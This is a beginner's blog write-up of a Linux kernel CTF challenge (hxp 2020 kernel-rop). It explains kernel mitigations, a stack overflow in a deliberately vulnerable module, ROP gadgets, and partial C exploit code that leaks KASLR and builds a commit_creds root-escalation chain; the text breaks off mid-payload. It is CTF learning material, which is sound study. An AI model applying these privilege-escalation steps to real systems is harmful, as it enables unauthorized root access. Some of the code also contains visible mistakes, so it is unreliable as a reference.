@@ -1,0 +1,630 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Kernel Hacking: Getting Started :: Av&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="So in this blog post i will be writing about kernel pwning / kernel hacking (linux).I was also fascinated with how the kernel worked and to me it was always very mystical and seemed something extremely complicated (extended inline assembly seemed like it was elvish writing ). I will be writing about various steps i took to start kernel hacking .So lets get started !
+I will be starting with a challenge from hxp-ctf 2020 kerne-rop , Why ?" />
+<meta name="keywords" content=", " />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/kernel-hacking-getting-started/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/red.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/red.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://twitter.com/0xAtharv" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Kernel Hacking: Getting Started">
+<meta property="og:description" content="So in this blog post i will be writing about kernel pwning / kernel hacking (linux).I was also fascinated with how the kernel worked and to me it was always very mystical and seemed something extremely complicated (extended inline assembly seemed like it was elvish writing ). I will be writing about various steps i took to start kernel hacking .So lets get started !
+I will be starting with a challenge from hxp-ctf 2020 kerne-rop , Why ?" />
+<meta property="og:url" content="/posts/kernel-hacking-getting-started/" />
+<meta property="og:site_name" content="Av&#39;s Blog" />
+
+  
+  
+  <meta property="og:image" content="/">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-12-14 20:00:44 &#43;0530 IST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="red">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Av&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/posts">Posts</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/posts" >Posts</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/kernel-hacking-getting-started/">Kernel Hacking: Getting Started</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-12-14</time></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/"></a>&nbsp;
+      
+      #<a href="/tags/"></a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#somethings-to-note">Somethings to note</a></li>
+    <li><a href="#the-vulns">The Vulns</a></li>
+    <li><a href="#exploitation">Exploitation</a></li>
+    <li><a href="#closing-thoguhts">Closing Thoguhts</a></li>
+  </ul>
+</nav>
+    </div>
+  
+
+  <div class="post-content"><div>
+        <p>So in this blog post i will be writing about kernel pwning / kernel hacking (linux).I was also fascinated with how the kernel worked and to me it was always very mystical and seemed something extremely complicated (extended inline assembly seemed like it was elvish writing ). I will be writing about various steps i took to start kernel hacking .So lets get started !</p>
+<p>I will be starting with a challenge from hxp-ctf 2020 kerne-rop , Why ? because its a classic bof and it had a lot of good well documented writeups i can refer to :) !</p>
+<p>DISCLAIMER: I am very new to kernel pwn so if you think something in the blog post seems a little off or is wrong feel free to reach out and correct me !
+Debugging Setup⌗</p>
+<p>so the initial Qemu script provided to us looks like this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>qemu-system-x86_64 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -m 128M <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -cpu kvm64,+smep,+smap <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -kernel vmlinuz <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -initrd initramfs.cpio.gz <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -hdb flag.txt <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -snapshot <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -nographic <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -monitor /dev/null <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -no-reboot <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -append <span style="color:#e6db74">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
+</span></span></code></pre></div><p>adding -s to qemu script enable the debugging interface.</p>
+<pre tabindex="0"><code>#!/bin/sh
+qemu-system-x86_64 \
+    -s \  
+    -m 128M \ 
+    -cpu kvm64,+smep,+smap \
+    -kernel vmlinuz \
+    -initrd initramfs.cpio.gz \
+    -hdb flag.txt \
+    -snapshot \
+    -nographic \
+    -monitor /dev/null \
+    -no-reboot \
+    -append &#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;
+</code></pre><h2 id="somethings-to-note">Somethings to note<a href="#somethings-to-note" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><code>SMEP,SMAP,KASLR,FG-KASLR and KPTI</code> are enabled by default, we will talk about what they do in just a second</p>
+<p><em><strong>What is SMEP and SMAP?</strong></em></p>
+<p><em>SMEP</em> stands for <em>Supervisor mode execution protection (SMEP)</em> is a kernel protection mechanism introduced to preventt ret2usr.SMEP marks userland pages Non-executable</p>
+<p><em>SMAP</em> stands for <em>Supervisor Mode Access Protection</em> it marks userland pages as non-readable</p>
+<p>SMEP and SMAP can be enabled using the 20th and 21st bit of the CR4(Control Register) register which is a priviliged register.</p>
+<p><em>KASLR</em> stands for <em>Kernel Address Space Layout Randomization</em> it is the same as we see in userland pwn where a loaded libraries are loaded at a random address.KASLR loads the kernel image at a random address.</p>
+<p><em>FG-KASLR</em> : what FG-KASLR does is it changes the offsets of functions each time the kernel is loaded , but how would this work ?? doesnt the kernel need function addresses too if everything is completely random the kernel cant resolve the functions. well not all functions are at a random offset some functions and structures are not randomized like the ksymtab (this is actually a section in the ELF file ) which contains the offset to other functions in the kernbael .This offset is from the ksymtab symbols entry to the actual function.</p>
+<p><em>KPTI</em> stands for <em>Kernel Page Table Isolation</em> this protection was introduced in order to protect systems against the Meltdown vulnerability .Previously known as KAISER (kernel address isolation to have side-channels efficiently removed) . what KPTI does is it creates two separate page tables for userland and kernel space so the kernel page table has all Userland page table entries + kernel page table entries but the userland page has userland page table entried and only some limited kernel page table entries</p>
+<p>The <a href="https://elixir.bootlin.com/linux/latest/source/kernel/module/internal.h#L35">kernel_symbol</a> struct:</p>
+<p>struct kernel_symbol {
+int value_offset;
+int name_offset;
+int namespace_offset;
+};</p>
+<p>looking at it in gdb prepare_kernel_cred function in ksymtab:</p>
+<p><img src="images/term1.png" alt="prepare_kernel_cred"></p>
+<p>By cat /proc/kasllysms we can look at all kernel symbols we see that prepare_kernel_cred is at 0xffffffff814c67f0 and __ksymtab_prepare_kernel_cred is at 0xffffffff81f8d4fc</p>
+<p><img src="images/term2.png" alt="prepare_kernel_cred"></p>
+<p>now adding the value_offset to the ksym address we see we are at the prepare_kernel_cred address which is (0xffffffff81f8d4fc-0xac6d0c) = 0xffffffff814c67f0 by adding the 0x000134b2 offset to (0xffffffff81f8d4fc+0x4) we get the string “prepare_kernel_cred”
+Using Ghidra to decompile the Binary⌗</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">hackme_read</span>(file <span style="color:#f92672">*</span>f,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data,<span style="color:#66d9ef">size_t</span> size,<span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar2;
+</span></span><span style="display:flex;"><span>  ulong uVar3;
+</span></span><span style="display:flex;"><span>  ulong size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_GS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> tmp [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__fentry__</span>();
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__memcpy</span>(hackme_buf,tmp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">&lt;</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__warn_printk</span>(<span style="color:#e6db74">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0x1000</span>,size);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">invalidInstructionException</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__check_object_size</span>(hackme_buf,size,<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>  lVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_copy_to_user</span>(data,hackme_buf,size);
+</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffffffffff2</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> uVar3;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">ssize_t</span> <span style="color:#a6e22e">hackme_write</span>(file <span style="color:#f92672">*</span>f,<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>data,<span style="color:#66d9ef">size_t</span> size,<span style="color:#66d9ef">loff_t</span> <span style="color:#f92672">*</span>off)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar1;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> lVar2;
+</span></span><span style="display:flex;"><span>  ulong uVar3;
+</span></span><span style="display:flex;"><span>  ulong size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">long</span> in_GS_OFFSET;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> tmp [<span style="color:#ae81ff">32</span>];
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__fentry__</span>();
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#ae81ff">0x1000</span> <span style="color:#f92672">&lt;</span> size) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__warn_printk</span>(<span style="color:#e6db74">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">0x1000</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">invalidInstructionException</span>();
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">while</span>( true );
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__check_object_size</span>(hackme_buf,size,<span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>  lVar2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">_copy_from_user</span>(hackme_buf,data,size);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__memcpy</span>(tmp,hackme_buf,size);
+</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#f92672">=</span> size;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    uVar3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xfffffffffffffff2</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">==</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">long</span> <span style="color:#f92672">*</span>)(in_GS_OFFSET <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x28</span>)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> uVar3;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e">/* WARNING: Subroutine does not return */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__stack_chk_fail</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="the-vulns">The Vulns<a href="#the-vulns" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>The bug here is obvious that we can send a size larger than the size of buffer and overflow it while writing and the same goes for reading data from the hackme_buff.</p>
+<h2 id="exploitation">Exploitation<a href="#exploitation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>so looking at the primitives we have which are very powerful we can read values from and stack and write value to the stack.but in kernel exploitatio our goal is not to get a shell but to get root so we do that by calling:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#a6e22e">commit_creds</span>(<span style="color:#a6e22e">prepare_kernel_cred</span>(<span style="color:#ae81ff">0</span>));
+</span></span></code></pre></div><p>lets setup some basic kernel exploit code:</p>
+<p><em><strong>Read functionality</strong></em></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> global_fd;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> cookie;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">hm_open</span>(){
+</span></span><span style="display:flex;"><span>    global_fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/dev/hackme&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (global_fd <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Failed &#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0x1337</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[*] Opened device /dev/hackme&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">popShell</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;[+] Returned to userland&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">getuid</span>() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;got root!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">getuid</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Ooops it looks like we failed</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0x1337</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When we are reading and writing to the global fd we are actually accessing the hackme_buff verify this by:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>&gt;cat /proc/kallsyms | grep <span style="color:#e6db74">&#39;hackme&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ffffffffc033e180 t hackme_release	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033e000 t hackme_write	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033e1a0 t hackme_open	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033e0c0 t hackme_read	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc0340000 d hackme_misc	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033e18d t hackme_exit	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033f0a0 r hackme_fops	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033f076 r .LC1	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033f1a0 r _note_7	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc0340080 d __this_module	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc033e18d t cleanup_module	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>ffffffffc0340440 b hackme_buf	<span style="color:#f92672">[</span>hackme<span style="color:#f92672">]</span>
+</span></span></code></pre></div><p>just like userland pwn we need to find the stack cookie and get a kaslr leak if we examine the hackme_buf carefully the hackme_buf[38] is a address which is not affected by FG-KASLR and is at a constant offset, so leaking it will defeat kaslr.</p>
+<p>ROP gadgets used:</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">KPTI TRAMPOLINE:
+	mov    rdi,rsp
+	mov    rsp,QWORD PTR gs:0x6004
+	push   QWORD PTR [rdi+0x30]
+	push   QWORD PTR [rdi+0x28]
+	push   QWORD PTR [rdi+0x20]
+	push   QWORD PTR [rdi+0x18]
+	push   QWORD PTR [rdi+0x10]
+	push   QWORD PTR [rdi]
+	push   rax
+	xchg   ax,ax
+	mov    rdi,cr3
+	jmp    0xffffffff85200f7f
+	mov    rax,rdi
+	and    rdi,0x7ff
+	bt     QWORD PTR gs:0x2ae56,rdi
+	jae    0xffffffff85200f70
+	btr    QWORD PTR gs:0x2ae56,rdi
+	mov    rdi,rax
+	jmp    0xffffffff85200f78
+	mov    rdi,rax
+	bts    rdi,0x3f
+	or     rdi,0x800
+	or     rdi,0x1000
+	mov    cr3,rdi
+	pop    rax
+	pop    rdi
+	swapgs 
+	nop    DWORD PTR [rax]
+	jmp    0xffffffff85200fc0
+	nop
+	pop    r15
+	pop    r14
+	pop    r13
+	pop    r12
+	pop    rbp
+	pop    rbx
+	pop    r11
+	pop    r10
+	pop    r9
+	pop    r8
+	pop    rax
+	pop    rcx
+	pop    rdx
+	pop    rsi
+	pop    rdi
+	add    rsp,0x8
+	jmp    0xffffffff85200fc0
+	nop
+	nop    DWORD PTR [rax+rax*1+0x0]
+	test   BYTE PTR [rsp+0x20],0x4
+	jne    0xffffffff85200fc9
+	iretq  
+
+pop_rax:
+         pop rax
+         retq  
+
+pop_rdi_rbp:
+        pop rdi
+        pop rbp
+        ret
+read_mem:
+        mov eax, DWORD PTR [rax+0x10]
+        pop rbp
+        ret
+        
+</code></pre><p>KPTI TRAMPOLINE:for the kpti all we need to know what it has a swapgs and iretq gadgets which helps us go to userland</p>
+<p>read_mem gadget: we use this to read a DWORD value from a ptr stored in RAX+0x10 ans store it into eax . We will use this gadget to read the the value_offset from the kernel_symbol structure for prepare_kernel_cred and commit_creds functions</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">leak</span>(){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> buff[n];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(global_fd,buff,<span style="color:#66d9ef">sizeof</span>(buff));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>image_base <span style="color:#f92672">=</span> buff[<span style="color:#ae81ff">38</span>]<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa157ULL</span>
+</span></span><span style="display:flex;"><span>kpti_trampoline <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x200f10UL</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">22UL</span>;
+</span></span><span style="display:flex;"><span>pop_rax_ret <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4d11UL</span>;
+</span></span><span style="display:flex;"><span>read_mem_pop1_ret <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x4aaeUL</span>;
+</span></span><span style="display:flex;"><span>pop_rdi_rbp_ret <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x38a0UL</span>;
+</span></span><span style="display:flex;"><span>ksymtab_prepare_kernel_cred <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf8d4fcUL</span>;
+</span></span><span style="display:flex;"><span>ksymtab_commit_creds <span style="color:#f92672">=</span> image_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0xf87d90UL</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>the exploit will be made completed in 4 parts:</p>
+<p>step1 : leak the prepare_kernel_cred offset from __ksymtab_prepare_kernel_cred</p>
+<p>step2 : leak the commit_creds offset from __ksymtab_commit_creds</p>
+<p>step3: execute commit_creds(prepare_kernel_cred(0))</p>
+<p>step4 : pop a root shell !!!</p>
+<p>step 1:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> tmp,commit_creds;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> struct_commit_creds;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">prepare_kernel_creds_asm_save</span>(<span style="color:#66d9ef">void</span>){
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__asm__</span>(
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.intel_syntax noprefix;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;mov tmp,rax;&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;.att_syntax;&#34;</span>
+</span></span><span style="display:flex;"><span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>commit_creds <span style="color:#f92672">=</span> ksymtab_commit_creds <span style="color:#f92672">+</span> tmp;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">step2</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">step1</span>(){
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> payload[<span style="color:#ae81ff">50</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> offs<span style="color:#f92672">=</span><span style="color:#ae81ff">16</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 16 is the cookie offset
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs] <span style="color:#f92672">=</span> cookie;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbx 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// r12 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0</span>; <span style="color:#75715e">// rbp
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> pop_rax_ret; <span style="color:#75715e">// function ret 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> ksymtab_prepare_kernel_cred<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span>;
+</span></span><span style="display:flex;"><span>payload[offs<span style="color:#f92672">++</span>] <span style="color:#f92672">=</span> read_mem_pop1_ret; <span style="color:#75715e">// 
